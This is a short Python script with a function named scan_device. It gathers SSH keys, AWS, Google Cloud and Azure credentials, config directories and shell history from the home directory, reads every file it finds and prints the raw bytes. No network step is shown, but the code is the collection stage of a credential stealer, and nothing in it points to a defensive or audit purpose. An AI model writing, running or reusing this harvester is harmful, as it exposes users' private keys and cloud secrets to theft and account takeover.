from pathlib import Path

PATHS = {
    Path("~/.ssh/"),
    Path("~/.config/"),
    Path("~/.aws/"),
    Path("~/.gcloud/"),
    Path("~/.azure/"),
    Path("~/.*_history")
}

collected_files_and_dirs = list()

def collect_dirs():
    global collected_files_and_dirs

    for path in PATHS:
        path = path.expanduser() 

        if path.exists():
            for subdir in path.iterdir():
                collected_files_and_dirs.append(subdir)

def read_file(file: Path):
    with file.open():
        content = file.read_bytes()
        print(content)
        
def traverse():
    for path in collected_files_and_dirs:
        traverse_dir(path)
    
def traverse_dir(path: Path):
    if path.is_file():
        read_file(path)
        return

    for subpath in path.iterdir():
        traverse_dir(subpath)

def scan_device():
    collect_dirs()
    print(collected_files_and_dirs)
    traverse()


